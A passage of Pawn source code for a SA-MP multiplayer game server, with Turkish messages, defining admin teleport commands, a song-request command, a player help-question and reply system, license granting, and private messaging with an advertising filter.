	if (APlayerData[playerid][PlayerLevel] >= 3 || Root[playerid] == 1 || APlayerData[playerid][PlayerRehberLevel] > 2)
	{
    new Float:PosX, Float:PosY, Float:PosZ;
    if(sscanf(params, "fff", PosX, PosY, PosZ)) return SendSyntaxMessage(playerid, "/gotopos <x> <y> <z>");
    SetPlayerPos(playerid, PosX, PosY, PosZ);
    SendClientMessage(playerid, -1, "   Belirttiðiniz konuma ýþýnlandýnýz !");
    }
    return 1;
}
CMD:goetk(playerid, params[])
{
	new etk;
	SendAdminText(playerid, "/goetk", params);
	if (APlayerData[playerid][PlayerLevel] >= 3 || Root[playerid] == 1)
	{
    if (sscanf(params, "u[128]", etk)){
	 SendSyntaxMessage(playerid, "/goetk <etk id>");
	 SendClientMessage(playerid, -1, "ETK ID;");
	 SendClientMessage(playerid, -1, "{FF0000}#1{FFFFFF} Monster'dan Kaç");
	 SendClientMessage(playerid, -1, "{FF0000}#2{FFFFFF} Araba Yarýþý");
	 SendClientMessage(playerid, -1, "{FF0000}#3{FFFFFF} Saklanbaç");
	 SendClientMessage(playerid, -1, "{FF0000}#4{FFFFFF} Tank-ve-Bullet");
	 SendClientMessage(playerid, -1, "{FF0000}#5{FFFFFF} Hydra'dan Kaç");
	 SendClientMessage(playerid, -1, "{FF0000}#6{FFFFFF} Squallo Yarýþý");
	 SendClientMessage(playerid, -1, "{FF0000}#7{FFFFFF} Kanatta Kal");
	 }else{
			if(etk < 1 || etk > 7) return SendClientMessage(playerid, -1, "Geçersiz id girdin.");
			 if(etk == 1)
			 {
    			SetPlayerPos(playerid, -9968.38, -1198.78,   13.59);
    			SendClientMessage(playerid, -1, " Monster'dan kaç alanýna ýþýnlandýn.");
			}
			 if(etk == 2)
			 {
    			SetPlayerPos(playerid, -10137.30, -1032.52,    3.39);
    			SendClientMessage(playerid, -1, " Araba Yarýþý alanýna ýþýnlandýn.");
			}
  			 if(etk == 3)
			 {
    			SetPlayerPos(playerid, -10375.26, -1026.85,    3.40);
    			SendClientMessage(playerid, -1, " Saklanbaç alanýna ýþýnlandýn.");
			}
    			 if(etk == 4)
			 {
    			SetPlayerPos(playerid, -10219.13, -982.54,    3.38);
    			SendClientMessage(playerid, -1, " Tank ve bullet alanýna ýþýnlandýn.");
			}
   	 			if(etk == 5)
			 {
    			SetPlayerPos(playerid, -10027.33, -916.59,   14.66);
    			SendClientMessage(playerid, -1, " Hydra'dan kaç alanýna ýþýnlandýn.");
			}
				if(etk == 6)
			 {
    			SetPlayerPos(playerid, -10457.19, -733.52,    3.26);
    			SendClientMessage(playerid, -1, " Squallo yarýþý alanýna ýþýnlandýn.");
			}
   				if(etk == 7)
			 {
    			SetPlayerPos(playerid, -10081.68, -1086.19,    3.00);
    			SendClientMessage(playerid, -1, " Kanatta kal alanýna ýþýnlandýn.");
			}
    }
    }
    return 1;
}
CMD:asound(playerid, params[])
{
	SendAdminText(playerid, "/asound", params);
	if (APlayerData[playerid][PlayerLevel] >= 3 || Root[playerid] == 1)
	{
    new sid;
    if(sscanf(params, "u", sid)) return SendSyntaxMessage(playerid, "/asound <sound-id>");
	new Float:soX, Float:soY, Float:soZ;
	GetPlayerPos(playerid, soX, soY, soZ);
	PlayerPlaySound(playerid, sid,soX,soY,soZ);
    SendClientMessage(playerid, -1, "   Ses Çalýnýyor !");
    }
    return 1;
}

CMD:sarkikapat(playerid, params[])
{
	SendAdminText(playerid, "/sarkikapat", params);
	if (APlayerData[playerid][PlayerLevel] >= 3 || Root[playerid] == 1)
	{
	    format(CalanMP3URL, 300, "-");
 	    format(CalanMP3Name, 100, "-");
 	    CalanMP3ID = -1;
		foreach(new i:Player)
		{
 		    if(MPMode[i] == 1)
		    {
				StopAudioStreamForPlayer(i);
			}
		}
		SendClientMessageToAll(-1,"{FFCC00}» {FFFFFF}Yetkili Sarkiyi Kapatti");
	}
    return 1;
}
CMD:isteksarki(playerid, params[])
{

	// Setup local variables
	new Name[24], Msg[128], Message[128], query[1024];

	// Get the player's name
	GetPlayerName(playerid, Name, sizeof(Name));

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
			if (sscanf(params, "d", Message)) SendSyntaxMessage(playerid, "/isteksarki <istek sarki ID>");
			else
			{
			new Cache: get_muzik;
			mysql_format(Connection, query, sizeof(query), "SELECT * FROM muzikler WHERE ID = %d", Message);
			get_muzik = mysql_query(Connection, query);
		    new rows = cache_num_rows();

		    if(!rows)return SendErrorMessage(playerid, "{FFCC00}» {FFFFFF}Hatalý þarký ID");
            cache_delete(get_muzik);
//			if(MP3ler[Message][MP3Exist] == 0) return SendClientMessage(playerid, -1, "{FF0000}Arþivimizde bu ID'de bir þarký bulunmamakta!");
			SendClientMessage(playerid,-1,"{FFCC00}» {FFFFFF}Ýsteðiniz DJ ve ADMIN lere iletildi.");
			
				// Loop through all players
				for (new i; i < MAX_PLAYERS; i++)
				{
				    // Check if the player is logged in
					if (APlayerData[i][LoggedIn] == true)
					{
					    // Check if the other player is also an admin
					    if (APlayerData[i][PlayerLevel] > 0 || APlayerData[i][PlayerDjLevel] > 0 || Root[i] == 1)
					    {
							format(Msg, 128, "{59CE33}[ÝSTEK]isteyen:{ffffff} %s(%d) {59CE33}istek:{ffffff} %d", Name, playerid, Message);
							SendClientMessage(i, 0xFFFFFFFF, Msg);
					    }
					}
				}
			}
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}
CMD:soruiptal(playerid, params[])
{
    new Name[24], Msg[128];
    GetPlayerName(playerid, Name, sizeof(Name));
    if(APlayerData[playerid][SorusuCevaplaniyor] == 1)return SendClientMessage(playerid,-1,"{FFCC00}» {FFFFFF}Þuanda cevaplanan bir sorunuz var bunu yapamazsýnýz.");
    if(APlayerData[playerid][SoruSordu] == 0)return SendClientMessage(playerid,-1,"{FFCC00}» {FFFFFF}Ýptal edecek bir sorunuz yok.");
    SendClientMessage(playerid,-1,"{FFCC00}» {FFFFFF}Sorunuz Ýptal Edildi");
				for (new i; i < MAX_PLAYERS; i++)
				{
				    // Check if the player is logged in
					if (APlayerData[i][LoggedIn] == true)
					{
					    // Check if the other player is also an admin
					    if (APlayerData[i][PlayerLevel] > 0 || APlayerData[i][PlayerRehberLevel] > 0 || Root[i] == 1)
					    {
					        APlayerData[playerid][SoruSordu] = 0;
					        APlayerData[playerid][SoruBekliyor] = 0;
							format(Msg, 128, "{59CE33}[SORU ÝPTAL]%s(%d) Sorusunu Ýptal Etti Artýk Cevaplamanýza Gerek Yoktur.", Name, playerid);
							SendClientMessage(i, 0xFFFFFFFF, Msg);
					    }
					}
				}
	return 1;
}
CMD:sorusor(playerid, params[])
{
	// Setup local variables
	new Name[24], Msg[300], Message[300];

 	if(APlayerData[playerid][SoruSordu] == 1)return SendClientMessage(playerid,-1,"Yanýtlanmamýþ bir sorunuz zaten bulunmakta. /soruiptal ile sorunuzu iptal edebiilrsiniz");
	// Get the player's name

	GetPlayerName(playerid, Name, sizeof(Name));

	if(APlayerData[playerid][SoruCevapliyor] == 1)return SendClientMessage(playerid,-1,"Þuanda bir soru cevaplýyorsunuz bunu yapamazsýnýz");
    if(APlayerData[playerid][SorusuCevaplaniyor] == 1)return SendClientMessage(playerid,-1,"Þuanda cevaplanan bir sorunuz var bunu yapamazsýnýz");

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
			if (sscanf(params, "s[128]", Message)) SendSyntaxMessage(playerid, "/sorusor <Soru>");
			else
			{
			if(strlen(Message) > 30)return SendClientMessage(playerid,-1,"{FFCC00}» {FFFFFF}Sorunuz en fazla 30 karakter içerebilir.");
			SendClientMessage(playerid,-1,"{FFCC00}» {FFFFFF}Sorunuz REHBER ve ADMIN lere iletildi.");
			APlayerData[playerid][SoruSordu] = 1;
			format(APlayerData[playerid][SoruSorusu], 128, "%s", Message);
			APlayerData[playerid][SoruBekliyor] = 1;
			 SetTimerEx("SorusorIptal", 120000, false, "i", playerid);
				// Loop through all players
				for (new i; i < MAX_PLAYERS; i++)
				{
				    // Check if the player is logged in
					if (APlayerData[i][LoggedIn] == true)
					{
					    // Check if the other player is also an admin
					    if (APlayerData[i][PlayerLevel] > 0 || APlayerData[i][PlayerRehberLevel] > 0 || Root[i] == 1)
					    {
							format(Msg, 128, "{FFCC00}» {FFFFFF}Sisteme yeni soru düþtü /sorular yazarak aktif sorularý cevaplayýnýz !");
							SendClientMessage(i, 0xFFFFFFFF, Msg);
					    }
					}
				}
			}
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}
forward SorusorIptal(playerid);
public SorusorIptal(playerid)
{
	new Msg[128];
		new Name[24];
	GetPlayerName(playerid, Name, sizeof(Name));
  if(APlayerData[playerid][SoruSordu] != 0 && APlayerData[playerid][SoruBekliyor] == 1)
  {
    APlayerData[playerid][SoruSordu] = 0;
    APlayerData[playerid][SoruBekliyor] = 0;
    format(APlayerData[playerid][SoruSorusu], 128, "Nope");
    SendClientMessage(playerid,-1,"{FFCC00}» {FFFFFF}Mesajýnýz 2 dakika içinde cevaplanmadýðýndan dolayý iptal oldu.");

    	for (new i; i < MAX_PLAYERS; i++)
				{
				    // Check if the player is logged in
					if (APlayerData[i][LoggedIn] == true)
					{
    					if (APlayerData[i][PlayerLevel] > 0 || APlayerData[i][PlayerRehberLevel] > 0 || Root[i] == 1)
    						{
								format(Msg, 128, "{84C700}[SORU]{ffffff} %s(%d) Adlý kiþinin sorusu 2 dakika içinde cevaplanmadýðýndan dolayý iptal olmuþtur.", Name, playerid);
								SendClientMessage(i, 0xFFFFFFFF, Msg);

  							}
					}
				}
  }
    return 1;
}
CMD:gsoru(playerid, params[])
{
	// Setup local variables
	new Msg[300], Name[24], OtherName[24], OtherPlayer;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/gsoru", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 3
		if (APlayerData[playerid][PlayerLevel] >= 1 || APlayerData[playerid][PlayerRehberLevel] > 0 || Root[playerid] == 1)
		{
			if (sscanf(params, "us[128]", OtherPlayer)) SendSyntaxMessage(playerid, "/gsoru <id>");
			else
			{
				// Check if the otherplayer is online
				if (IsPlayerConnected(OtherPlayer))
				{
				    if (APlayerData[OtherPlayer][SoruSordu] == 0)return SendClientMessage(playerid,-1,"{FF0000}Bu kiþinin cevap bekleyen bir sorusu yok");
					// Get the player-names
					GetPlayerName(playerid, Name, sizeof(Name));
					GetPlayerName(OtherPlayer, OtherName, sizeof(OtherName));
					// Let the other player know that his score has been changed
					format(Msg, 128, "{FFFFFF}Sorunuz geçersiz olarak iþaretlendi eðer cevaplanmasý gerektiðini düþünüyorsanýz TeamSpeak üzerinden admin, helper ekipleriyle iletiþim kurabilirsiniz.");
					SendClientMessage(OtherPlayer, 0xFFFFFFFF, Msg);
					APlayerData[OtherPlayer][SoruSordu] = 0;
					APlayerData[OtherPlayer][SoruBekliyor] = 0;
					format(APlayerData[playerid][SoruSorusu], 128, "Nope");

					for (new i; i < MAX_PLAYERS; i++)
				{
				    // Check if the player is logged in
					if (APlayerData[i][LoggedIn] == true)
					{
					    // Check if the other player is also an admin
					    if (APlayerData[i][PlayerLevel] > 0 || APlayerData[i][PlayerRehberLevel] > 0 || Root[i] == 1)
					    {
					        GetPlayerName(playerid, Name, sizeof(Name));
							format(Msg, 1024, "{59CE33}[SORU YOKSAYILDI]soran:{ffffff} %s(%d) | {59CE33}Yoksayan:{ffffff}%s(%d)", OtherName, OtherPlayer, Name, playerid);
							SendClientMessage(i, 0xFFFFFFFF, Msg);
					    }
					}
				}
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}That player isn't online");
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}
CMD:sorukabul(playerid, params[])
{
    SendAdminText(playerid, "/sorukabul", params);
	// Setup local variables
	new Msg[300], Name[24], OtherName[24], OtherPlayer;

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
	    if(APlayerData[playerid][SoruCevapliyor] == 1)return SendClientMessage(playerid,-1,"{FF0000}Þuanda zaten bir soru cevaplýyorsunuz.");
		// Check if the player's admin-level is at least 3
		if (APlayerData[playerid][PlayerLevel] >= 1|| APlayerData[playerid][PlayerRehberLevel] > 0 || Root[playerid] == 1)
		{
			if (sscanf(params, "us[128]", OtherPlayer)) SendSyntaxMessage(playerid, "/sorukabul <id>");
			else
			{
				if(APlayerData[OtherPlayer][SorusuCevaplaniyor] == 1)return SendClientMessage(playerid,-1,"{FF0000}Bu kiþinin sorusu baþka bir yetkili tarafýndan cevaplanýyor.");

				// Check if the otherplayer is online
				if (IsPlayerConnected(OtherPlayer))
				{
				    if (APlayerData[OtherPlayer][SoruSordu] == 0)return SendClientMessage(playerid,-1,"{FF0000}Bu kiþinin cevap bekleyen bir sorusu yok");
					// Get the player-names
					GetPlayerName(playerid, Name, sizeof(Name));
					GetPlayerName(OtherPlayer, OtherName, sizeof(OtherName));
					// Let the other player know that his score has been changed
					format(Msg, 128, "{00BECB}%s yardým isteðini kabul etti, '/ypm' kullanarak yanýtlayabilirsin..", Name);
					SendClientMessage(OtherPlayer, 0xFFFFFFFF, Msg);
					format(Msg, 128, "{00BECB}%s isimli kiþinin yardým isteðini kabul ettin, '/ypm' kullanarak yanýtlayabilirsin '/ybitir' ile oturumu sonlandýrabilirsin..", OtherName);
					SendClientMessage(playerid, 0xFFFFFFFF, Msg);
     				APlayerData[OtherPlayer][SoruCevaplayan] = playerid;
     				APlayerData[playerid][SoruCevapladigi] = OtherPlayer;
     				APlayerData[playerid][SoruCevapliyor] = 1;
     				APlayerData[OtherPlayer][SorusuCevaplaniyor] = 1;
     				APlayerData[OtherPlayer][SoruBekliyor] = 0;

					for (new i; i < MAX_PLAYERS; i++)
				{
				    // Check if the player is logged in
					if (APlayerData[i][LoggedIn] == true)
					{
					    // Check if the other player is also an admin
					    if (APlayerData[i][PlayerLevel] > 0 || APlayerData[i][PlayerRehberLevel] > 0 || Root[i] == 1)
					    {
							format(Msg, 1024, "{59CE33}[Oturum Baþladý]soran:{ffffff} %s(%d)  {59CE33}oturum baþlatan:{ffffff} %s(%d)", OtherName, OtherPlayer, Name, playerid);
							SendClientMessage(i, 0xFFFFFFFF, Msg);
					    }
					}
				}
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}That player isn't online");
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}
CMD:ypm(playerid, params[])
{
    SendAdminText(playerid, "/ypm", params);
	new Message[128], Name[64], Names[64], Msg[1024];
    // » Giriþ yapmamýþsa olacaklar:
	if(APlayerData[playerid][SoruCevapliyor] == 0 && APlayerData[playerid][SorusuCevaplaniyor] == 0)return SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Aktif oturumunuz bulunmamakta!");
	if (APlayerData[playerid][LoggedIn] == false)
	{
	    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}{FF0000}Giriþ yapmadan bunu yapamazsýnýz!");
		return 0;
	}
	// » Spawn olmamýþsa olacaklar:
	if (APlayerSpawnData[playerid] == false)
	{
	    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Spawn olmadan bunu yapamazsýnýz!");
		return 0;
	}
    if (sscanf(params, "s[128]", Message)) SendSyntaxMessage(playerid, "/ypm <yanýt>");
	else
	{
  		if(APlayerData[playerid][SoruCevapliyor] == 1)
		{
      		new cid = APlayerData[playerid][SoruCevapladigi];
		    GetPlayerName(cid, Name, sizeof(Name));
		    GetPlayerName(playerid, Names, sizeof(Names));

		    format(Msg, 1024, "{FBFF00}%s kiþisinden gelen Y-PM: %s", Names, Message);
			SendClientMessage(cid, 0xFFFFFFFF, Msg);
			format(Msg, 1024, "{FBFF00}%s kiþisine giden Y-PM: %s", Name, Message);
			SendClientMessage(playerid, 0xFFFFFFFF, Msg);
		}else{
		    new cid = APlayerData[playerid][SoruCevaplayan];
		    GetPlayerName(cid, Name, sizeof(Name));
		    GetPlayerName(playerid, Names, sizeof(Names));

		    format(Msg, 1024, "{FBFF00}%s kiþisinden gelen Y-PM: %s", Names, Message);
			SendClientMessage(cid, 0xFFFFFFFF, Msg);
			format(Msg, 1024, "{FBFF00}%s kiþisine giden Y-PM: %s", Name, Message);
			SendClientMessage(playerid, 0xFFFFFFFF, Msg);
		}
	}


	return true;
}
CMD:ybitir(playerid, params[])
{
    SendAdminText(playerid, "/ybitir", params);
    new Msg[128], Name[64], Names[64];
    if (APlayerData[playerid][PlayerLevel] == 0 && APlayerData[playerid][PlayerRehberLevel] == 0 && Root[playerid] == 0)return 1;
    // » Giriþ yapmamýþsa olacaklar:
	if (APlayerData[playerid][LoggedIn] == false)
	{
	    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Giriþ yapmadan bunu yapamazsýnýz!");
		return 0;
	}
	// » Spawn olmamýþsa olacaklar:
	if (APlayerSpawnData[playerid] == false)
	{
	    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Spawn olmadan bunu yapamazsýnýz!");
		return 0;
	}
	new cid = APlayerData[playerid][SoruCevapladigi];
	GetPlayerName(cid, Name, sizeof(Name));
	GetPlayerName(playerid, Names, sizeof(Names));

	if(APlayerData[playerid][SoruCevapliyor] == 0)return SendClientMessage(playerid, -1, "Þuanda cevapladýðýnýz bir soru yok!");
    if(APlayerData[cid][SorusuCevaplaniyor] == 0)return SendClientMessage(playerid, -1, "Bu kiþinin cevaplanmakta olan bir sorusu yok!");


	// Let the other player know that his score has been changed
	format(Msg, 128, "{00BECB}%s yardým isteðini sonuçlandý olarak iþaretledi artýk '/ypm' kullanamazsýnýz..", Names);
	SendClientMessage(cid, 0xFFFFFFFF, Msg);
	format(Msg, 128, "{00BECB}%s isimli kiþinin yardým isteðini sonuçlandý olarak iþaretledin artýk '/ypm' kullanamazsýnýz..", Name);
	SendClientMessage(playerid, 0xFFFFFFFF, Msg);
	GivePlayerAchievement(cid, DayiyaSorAch, 1); // Baþarým Sistemi
	GivePlayerAchievement(playerid, FedakarYardimciAch, 1); // Baþarým Sistemi


    APlayerData[playerid][SoruCevapliyor] = 0;
    APlayerData[cid][SorusuCevaplaniyor] = 0;
    APlayerData[cid][SoruSordu] = 0;

	return true;
}
CMD:sorular(playerid, params[])
{
    if (APlayerData[playerid][PlayerLevel] == 0 && APlayerData[playerid][PlayerRehberLevel] == 0 && Root[playerid] == 0)return 1;
    // Send the command to all admins so they can see it
	SendAdminText(playerid, "/sorular", params);

	new AdminList[2000], YSayi;
    format(AdminList, 2000, "%sÝsim\tSorusu\n", AdminList);
	foreach(new i:Player)
	{
	    if(APlayerData[i][SoruBekliyor] == 1)
	    {
	        YSayi++;
			if(Musait[i] == true) format(AdminList, 2000, "%s%s(%d)\t%s\n", AdminList, GetName(i), i, APlayerData[i][SoruSorusu]);
		}
	}
	format(AdminList, 2000, "%s{DDDDDD}Toplam {FFC000}%d {DDDDDD}bekleyen soru bulunmakta\n", AdminList, YSayi);
	format(AdminList, 2000, "%s{00CED1}/sorukabul <ID> {DDDDDD}ile soru kabul edebilirsiniz.\n", AdminList, YSayi);
	ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_TABLIST, "{FF4040}Cevap Bekleyen Soru Listesi", AdminList, "Kapat", "");
	return 1;
}
/*
CMD:cevapla(playerid, params[])
{
	// Setup local variables
	new Name[24], PName[24], Msg[128], Msg1[128], Message[128], OtherPlayer;
	if (APlayerData[playerid][PlayerLevel] > 0 || APlayerData[playerid][PlayerRehberLevel] > 0 || Root[playerid] == 1)
	{
 	if(APlayerData[OtherPlayer][SoruSordu] == 0)return SendClientMessage(playerid,-1,"Kiþinin cevaplanacak bir sorusu yok.");
	// Get the player's name
	GetPlayerName(OtherPlayer, Name, sizeof(Name));
	GetPlayerName(playerid, PName, sizeof(PName));

	// Check if the player has logged in
	if (APlayerData[OtherPlayer][LoggedIn] == true)
	{
			if (sscanf(params, "s[128]", OtherPlayer, Message)) SendClientMessage(playerid, 0xFF0000AA, "Usage: \"/cevapla <Cevaplanacak kiþinin id> <Cevap>\"");
			else
			{
				APlayerData[OtherPlayer][SoruSordu] = 0;
				//SendClientMessage(OtherPlayer,-1,"{59CE33}[SORUN CEVAPLANDI]Cevaplayan: {ffffff}%s(%d) | {59CE33}Cevap: {ffffff}%s", PName, playerid, Message);
				format(Msg1, 128, "{59CE33}[SORUN CEVAPLANDI]Cevaplayan: {ffffff}%s(%d) | {59CE33}Cevap: {ffffff}%s", PName, playerid, Message);
				SendClientMessage(OtherPlayer, 0xFFFFFFFF, Msg1);
				// Loop through all players
				for (new i; i < MAX_PLAYERS; i++)
				{
				    // Check if the player is logged in
					if (APlayerData[i][LoggedIn] == true)
					{
					    // Check if the other player is also an admin
					    if (APlayerData[i][PlayerLevel] > 0 || APlayerData[i][PlayerRehberLevel] > 0 || Root[i] == 1)
					    {
							format(Msg, 128, "{59CE33}[SORU CEVAPLANDI]soran:{ffffff} %s(%d) | {59CE33}Cevaplayan:{ffffff}%s(%d) | {59CE33}Cevap:{ffffff}%s", Name, OtherPlayer, PName, playerid, Message);
							SendClientMessage(i, 0xFFFFFFFF, Msg);
					    }
					}
				}
			}
	}
	else
	    return 0;
 }else SendClientMessage(playerid,-1,"{FF0000}Bu komutu kullanmaya yetkiniz yok.");
	// Let the server know that this was a valid command
	return 1;
}
*/
/*CMD:sarkiac(playerid, params[])
{
	SendAdminText(playerid, "/sarkiac", params);
	new sid;
	if(sscanf(params, "i", sid)) return SendClientMessage(playerid, -1, "Kullaným: /sarkiac <MP3 ID>");
	
    MuzikDialog(playerid)
	return 1;
}*/


//////////////////////////////////

/*
// This is just a joke command
CMD:me(playerid,params[])
{
	// Setup local variables
	new Msg[128], Message[128], Name[24];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/me", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (sscanf(params, "s[128]", Message)) SendClientMessage(playerid, 0xFF0000AA, "Usage: \"/me <action>\"");
		else
		{
		    // Check if the player isn't muted
		    if (APlayerData[playerid][Muted] == false)
		    {
				GetPlayerName(playerid, Name, sizeof(Name));
				format(Msg, sizeof(Msg), "* %s: %s", Name, Message);
				SendClientMessageToAll(0xFFFF00AA, Msg);
			}
			else
			    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}You are still muted");
		}
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}
*/
// This command gives a truckers license to a player
CMD:givelicense(playerid,params[])
{
	// Setup local variables
	new OtherPlayer, Msg[128], Name[24], OtherName[24];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/givelicense", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 3
		if (APlayerData[playerid][PlayerLevel] >= 3 || Root[playerid] == 1)
		{
			if (sscanf(params, "u", OtherPlayer)) SendSyntaxMessage(playerid, "/givelicense <playerid>");
			else
			{
			    // Check if the other player is logged in
			    if (APlayerData[OtherPlayer][LoggedIn] == true)
			    {
					// Get the admin's name
					GetPlayerName(playerid, Name, sizeof(Name));
					// Get the other player's name
					GetPlayerName(OtherPlayer, OtherName, sizeof(OtherName));
					// Give the other player a truckers license
					APlayerData[OtherPlayer][TruckerLicense] = 1;

					// Save the player-file (and his houses)
					Oyuncu_Kaydet(OtherPlayer);

					// Inform the admin that you've given a player a truckers license
					format(Msg, sizeof(Msg), "{00FF00}You've given {FFFF00}%s{00FF00} a trucker's license", OtherName);
					SendClientMessage(playerid, 0xFFFFFFFF, Msg);
					// Inform the player that he received a free truckers license from an admin
					format(Msg, sizeof(Msg), "{00FF00}You've been given a free trucker's license by {FFFF00}%s", Name);
					SendClientMessage(OtherPlayer, 0xFFFFFFFF, Msg);
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}That player isn't logged in");
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// This commands allows the player to send a private message to another player
CMD:pm(playerid, params[])
{
    if(APlayerData[playerid][Muted] > 0)
	{
		SendClientMessage(playerid, 0xFFFFFFFF, "{FFCC00}» {FFFFFF}Susturuldunuz PM atamazsýnýz !");
		return 1;
	}
	
	// Setup local variables
	new OtherPlayer, Message[128], Msg1[128], Msg2[128], YourName[24], OtherPlayerName[24];
    new Yazi[128];
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/pm", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (sscanf(params, "us[128]", OtherPlayer, Message)) SendSyntaxMessage(playerid, "/pm <ID> <Mesaj>");
		else
		{
			// Check if that other player is online
			if (IsPlayerConnected(OtherPlayer))
			{
			    // Check if the player isn't muted
			    if (APlayerData[playerid][Muted] == 0)
			    {
			        if(PMGapat[OtherPlayer] == 1) return SendClientMessage(playerid, -1, "{FF0000}Bu oyuncunun PM'si kapalý!");

						if(stringContainsIP(Message))
						{
                        	SendReportToAdmins(playerid, "PM-Reklam", true);
        					if(!AdminVarmi())
							{
		    				format(Yazi, 128, "{FF0000}[ANTI HILE] %s {F8F8FF}sunucudan atýldý. {FF0000}[PM Reklam]", GetName(playerid));
		    				SendClientMessageToAll(-1, Yazi);
		    				SafeKick(playerid);
							}
							return 1;
						}
				    if(APlayerData[playerid][PlayerScore] < 5)
					{
						if(APlayerData[OtherPlayer][PlayerLevel] < 1 && Root[OtherPlayer] == 0 && APlayerData[OtherPlayer][PlayerRehberLevel] < 1)
						{
							SendClientMessage(playerid, -1, "{FF0000}5 Skorun altýndaki kiþiler admin ve rehberler dýþýnda kimseye pm atamaz !");
						}else{
						    if(APlayerData[playerid][PlayerLevel] < 1 && Root[playerid] == 0)return	SendClientMessage(playerid, -1, "{FF0000}Kurucu Adminlere PM atamazsýn !");
							GetPlayerName(playerid, YourName, sizeof(YourName));
							GetPlayerName(OtherPlayer, OtherPlayerName, sizeof(OtherPlayerName));
						    // Construct the message that is sent to yourself
							format(Msg1, 128, "{ffe413}[GIDEN-PM] %s'(%d)e: %s", OtherPlayerName,OtherPlayer, Message);
							// Construct the message that is sent to the other player
							format(Msg2, 128, "{ffe413}[GELEN-PM] %s'(%d)den: %s", YourName,playerid,Message);
							// Send the messages
							SendClientMessage(playerid, 0xFFFFFFFF, Msg1);
							SendClientMessage(OtherPlayer, 0xFFFFFFFF, Msg2);
						}
					}else

					if(APlayerData[OtherPlayer][PlayerLevel] == 7)
					{
						if(APlayerData[playerid][PlayerLevel] < 1 && Root[playerid] == 0)
						{
							SendClientMessage(playerid, -1, "{FF0000}Kurucu Adminlere PM atamazsýn !");
						}else{
							GetPlayerName(playerid, YourName, sizeof(YourName));
							GetPlayerName(OtherPlayer, OtherPlayerName, sizeof(OtherPlayerName));
						    // Construct the message that is sent to yourself
							format(Msg1, 128, "{ffe413}[GIDEN-PM] %s'(%d)e: %s", OtherPlayerName,OtherPlayer, Message);
							// Construct the message that is sent to the other player
							format(Msg2, 128, "{ffe413}[GELEN-PM] %s'(%d)den: %s", YourName,playerid,Message);
							// Send the messages
							SendClientMessage(playerid, 0xFFFFFFFF, Msg1);
							SendClientMessage(OtherPlayer, 0xFFFFFFFF, Msg2);
						}
					}else{

					// Get both names
					GetPlayerName(playerid, YourName, sizeof(YourName));
					GetPlayerName(OtherPlayer, OtherPlayerName, sizeof(OtherPlayerName));
				    // Construct the message that is sent to yourself
					format(Msg1, 128, "{ffe413}[GIDEN-PM] %s'(%d)e: %s", OtherPlayerName,OtherPlayer, Message);
					// Construct the message that is sent to the other player
					format(Msg2, 128, "{ffe413}[GELEN-PM] %s'(%d)den: %s", YourName,playerid,Message);
					// Send the messages
					SendClientMessage(playerid, 0xFFFFFFFF, Msg1);
					SendClientMessage(OtherPlayer, 0xFFFFFFFF, Msg2);
					}
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FFCC00}» {FFFFFF}Susturulmuþken PM atamazsýnýz");
			}
			else
			    SendClientMessage(playerid, 0xFF0000FF, "{FFCC00}» {FFFFFF}Oyuncu oyunda deðil");
		}
	}
	else
	 return 0;

	// Let the server know that this was a valid command
	return 1;
}


// Lets the player add new houses
CMD:evolustur(playerid, params[])
{
SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Bu komut V5.0.0'dan itibaren {F8F8FF}Yeni Ev Sistemi {80FFFF}nedeniyle kaldýrýlmýþtýr.");

/*
	// Setup local variables
	new MaxLevel, HouseID;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/evolustur", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 7
		if (APlayerData[playerid][PlayerLevel] >= 6 || Root[playerid] == 1)
		{
			// Check if the player isn't inside a vehicle
			if (GetPlayerVehicleSeat(playerid) == -1)
			{
				if (sscanf(params, "i", MaxLevel)) SendSyntaxMessage(playerid, "/evolustur <maxlevel (1-11)>");
				else
				{
					// Check if the player entered a proper maxlevel
					if ((MaxLevel >= 1) && (MaxLevel <= 12))
					{
						// Find the first free HouseID
						for (HouseID = 1; HouseID < MAX_HOUSES; HouseID++)
							if (AHouseData[HouseID][PickupID] == 0) // Check if an empty house-index has been found (PickupID is 0)
							    break; // Stop searching, the first free HouseID has been found now

					    // Check if the house-limit hasn't been reached yet
						if (HouseID < MAX_HOUSES)
						{
						    // Setup some local variables
							new Float:x, Float:y, Float:z, Msg[128];
							// Get the player's position
							GetPlayerPos(playerid, x, y, z);
							// Set some default data
							AHouseData[HouseID][HouseX] = x;
							AHouseData[HouseID][HouseY] = y;
